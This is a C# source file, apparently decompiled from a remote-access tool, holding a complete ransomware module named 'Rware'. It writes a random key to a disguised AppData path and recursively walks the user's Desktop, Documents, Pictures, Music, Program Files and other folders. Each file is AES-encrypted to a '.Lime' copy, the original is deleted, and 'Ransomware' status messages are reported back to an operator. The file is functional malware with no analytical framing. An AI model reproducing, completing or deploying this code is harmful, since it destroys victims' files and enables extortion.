using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

public class Rware
{
	private string string_0;

	private string string_1;

	public Rware()
	{
		Class13.eamVqU3zSE23Z();
		base._002Ector();
		string_0 = ".Lime";
		string_1 = Conversions.ToString(RandomString(50));
	}

	public string Calcul_Time(string time1)
	{
		int[] array = new int[12]
		{
			31, 28, 31, 30, 31, 30, 31, 31, 30, 31,
			30, 31
		};
		string text = "";
		string[] array2 = time1.Split(new char[1] { '/' });
		int i = 0;
		int num = Conversions.ToInteger(Conversion.Int((object)array2[0]));
		checked
		{
			for (; !Operators.ConditionalCompareObjectEqual((object)i, Operators.SubtractObject(Conversion.Int((object)array2[1]), (object)1), false); i++)
			{
				num += array[i];
			}
			text = Conversions.ToString(Conversion.Int(num) + 30);
			return text.ToString();
		}
	}

	public void GenKey()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (!Directory.Exists(folderPath + "\\Microsoft\\MMC"))
		{
			Directory.CreateDirectory(folderPath + "\\Microsoft\\MMC");
		}
		File.WriteAllText(folderPath + "\\Microsoft\\MMC\\hash", string_1);
		Launch_crypt();
	}

	public object RandomString(object size)
	{
		string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnop";
		Random random = new Random();
		string text2 = "";
		int num = Conversions.ToInteger(size);
		for (int i = 1; i <= num; i = checked(i + 1))
		{
			int startIndex = random.Next(0, Strings.Len(text));
			text2 += text.Substring(startIndex, 1);
		}
		return text2;
	}

	public object Launch_crypt()
	{
		Class6.smethod_25("MSG" + Class6.string_12 + "Ransomware: Please Wait..");
		string myPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
		Work_File(myPath);
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		Work_File(myPath);
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		Work_File(myPath);
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + "\\";
		Work_File(myPath);
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\";
		Work_File(myPath);
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "\\";
		Work_File(myPath);
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\";
		Work_File(myPath);
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\";
		Work_File(myPath);
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.Recent) + "\\";
		Work_File(myPath);
		File.Create(Path.GetTempPath() + "done.LE");
		Class6.smethod_25("MSG" + Class6.string_12 + "Ransomware: All files have been encrypted");
		return true;
	}

	public object Work_File(string MyPath)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = folderPath2 + "\\Ransomware.txt";
		checked
		{
			try
			{
				int num = ((ServerComputer)Class3.Class2_0).get_FileSystem().GetFiles(MyPath).Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if ((Operators.CompareString(((ServerComputer)Class3.Class2_0).get_FileSystem().GetFiles(MyPath)[i], Application.get_ExecutablePath(), false) != 0) | (Operators.CompareString(((ServerComputer)Class3.Class2_0).get_FileSystem().GetFiles(MyPath)[i], folderPath + "\\Microsoft\\MMC\\hash", false) != 0) | (Operators.CompareString(((ServerComputer)Class3.Class2_0).get_FileSystem().GetFiles(MyPath)[i], text, false) != 0) | (Operators.CompareString(((ServerComputer)Class3.Class2_0).get_FileSystem().GetFiles(MyPath)[i], folderPath2 + "\\" + Class6.string_8, false) != 0))
					{
						Crypt(((ServerComputer)Class3.Class2_0).get_FileSystem().GetFiles(MyPath)[i], string_1);
						((ServerComputer)Class3.Class2_0).get_FileSystem().DeleteFile(((ServerComputer)Class3.Class2_0).get_FileSystem().GetFiles(MyPath)[i]);
					}
				}
				int num2 = ((ServerComputer)Class3.Class2_0).get_FileSystem().GetDirectories(MyPath).Count - 1;
				for (int i = 0; i <= num2; i++)
				{
					Work_File(((ServerComputer)Class3.Class2_0).get_FileSystem().GetDirectories(MyPath)[i]);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			string[] result = default(string[]);
			return result;
		}
	}

	public object Crypt(object file, object key)
	{
		byte[] input = File.ReadAllBytes(Conversions.ToString(file));
		File.WriteAllBytes(Conversions.ToString(Operators.AddObject(file, (object)string_0)), AES_Encrypt(input, Conversions.ToString(key)));
		object result = default(object);
		return result;
	}

	public byte[] AES_Encrypt(byte[] input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] result = default(byte[]);
		try
		{
			byte[] array = new byte[32];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 16);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
			byte[] array2 = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			result = array2;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
